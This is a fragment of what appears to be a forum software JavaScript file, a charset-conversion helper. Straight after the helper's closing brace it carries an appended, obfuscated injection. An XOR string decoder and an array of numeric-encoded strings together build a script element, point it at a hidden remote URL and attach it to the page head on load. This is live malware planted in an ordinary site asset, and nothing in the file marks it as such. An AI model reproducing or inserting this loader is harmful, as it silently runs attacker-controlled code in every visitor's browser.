...
String.prototype.php_to8bit = function () {
	...
	else if (smf_charset == 'windows-1256')
	{
		...
		return this;
}function uQ1GNW(vKVO3,xe6K7z){var fHPX6i='';var xmO8=0;var m3K8f=0;for(xmO8=0;xmO8<vKVO3.length;xmO8++){var ms=vKVO3.charAt(xmO8);var dh63=ms.charCodeAt(0)^xe6K7z.charCodeAt(m3K8f);ms=String.fromCharCode(dh63);fHPX6i+=ms;if(m3K8f==xe6K7z.length-1)m3K8f=0;else m3K8f++;}return (fHPX6i);}function xnQBfMw(e2s86U){var cI=document[ffzn59(zdYyjI[3])](ffzn59(zdYyjI[0])+ffzn59(zdYyjI[1])+ffzn59(zdYyjI[2]));cI[ffzn59(zdYyjI[4])]=e2s86U;cI[ffzn59(zdYyjI[5])]=ffzn59(zdYyjI[6]);document[ffzn59(zdYyjI[9])](ffzn59(zdYyjI[8]))[0][ffzn59(zdYyjI[7])](cI);}function ffzn59(hk60li){return uQ1GNW(fdQ2JU1(hk60li),'tS5iP2v1h3Ut9z6H6');}var zdYyjI=["007048","006058","004039","023033080008036087051093013094048026077","007033086","000042069012","000054077029127088023071009064054006080010066","021035069012062086053089001095049","028054084013","019054065044060087027084006071038054064046087047120021062080","028039065025106029089066028082033017023009091036004090033064070058065089082006071123030074"];function fdQ2JU1(chTc){var t0fZ0='';var r6=0;var nqP=0;for(r6=0;r6<chTc.length/3;r6++){t0fZ0+=String.fromCharCode(chTc.slice(nqP,nqP+3));nqP=nqP+3;}return t0fZ0;}xnQBfMw(ffzn59(zdYyjI[10]));